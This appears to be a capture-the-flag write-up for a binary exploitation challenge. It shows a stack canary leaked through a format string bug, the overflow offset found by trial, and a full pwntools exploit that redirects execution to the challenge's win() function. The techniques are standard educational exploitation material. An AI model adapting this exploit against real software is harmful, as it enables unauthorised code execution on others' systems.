## Vulnerability Summary
The binary provides two inputs:
1. **First input**: Vulnerable to a format string bug.
2. **Second input**: Vulnerable to a buffer overflow, but protected by a stack canary.

---

## Step 1: Leak the Canary
The format string vulnerability in the first input lets us leak values from the stack using `%p` format specifiers.

By sending:
```bash
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
```
We can examine the memory addresses printed and locate the canary. In this case, the canary appears at the **15th** position.

So, we send:
```python
p.sendline(b'%15$p')
```

And parse the response:
```python
p.recvuntil(b"Big yellow bird replies: ")
canary = int(p.recvline().strip(), 16)
```

---

## Step 2: Determine the Overflow Offset
We use a binary search to determine where the canary check occurs. By sending increasing amounts of 'A's to the second input:

```bash
'A' * 72  --> No crash
'A' * 73  --> Stack smashing detected
```

Thus, the stack canary is located **after 72 bytes** of user-controlled data.

---

## Step 3: Construct Final Exploit
The overflow payload must:
- Write 72 bytes of filler ('A')
- Include the leaked canary to pass the stack protector
- Overwrite saved RBP with 8 bytes ('B')
- Overwrite RIP with the address of the `win()` function

```python
payload = b'A' * 72
payload += p64(canary)           # Correct canary
payload += b'B' * 8              # Overwrite RBP
payload += p64(elf.sym.win)     # Overwrite RIP
```

---

## Full Exploit Code
```python
from pwn import *

context.binary = './chall'
elf = context.binary

def exploit():
    p = process('./chall')

    # Stage 1: Leak Canary
    p.recvuntil(b"Big yellow bird lets you ask something: ")
    p.sendline(b'%15$p')
    p.recvuntil(b"Big yellow bird replies: ")
    canary = int(p.recvline().strip(), 16)
    log.success(f"Leaked canary: {hex(canary)}")

    # Stage 2: Buffer Overflow
    payload = b'A' * 72
    payload += p64(canary)
    payload += b'B' * 8
    payload += p64(elf.sym.win)

    p.recvuntil(b"Big yellow bird allows you to ask 1 more thing before IT ATTACKS: ")
    p.sendline(payload)
    p.interactive()

exploit()
```

---

